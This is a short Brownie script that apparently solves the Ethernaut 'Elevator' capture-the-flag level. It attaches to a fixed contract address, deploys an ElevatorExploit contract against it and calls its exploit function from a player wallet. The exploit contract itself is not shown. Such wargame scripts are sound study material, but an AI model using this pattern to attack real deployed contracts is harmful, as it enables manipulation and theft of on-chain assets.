from brownie import Elevator, ElevatorExploit, config,accounts

#input the contract address
#> contract.address
contractAddress = '0x891B43061E8ca9A9AE11Cfee69d06B2a6E4EcF2d'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    target = Elevator.at(contractAddress)
    exploit = ElevatorExploit.deploy(target.address,{"from":player})
    exploit.exploit({"from":player})

def main():
    solution()
    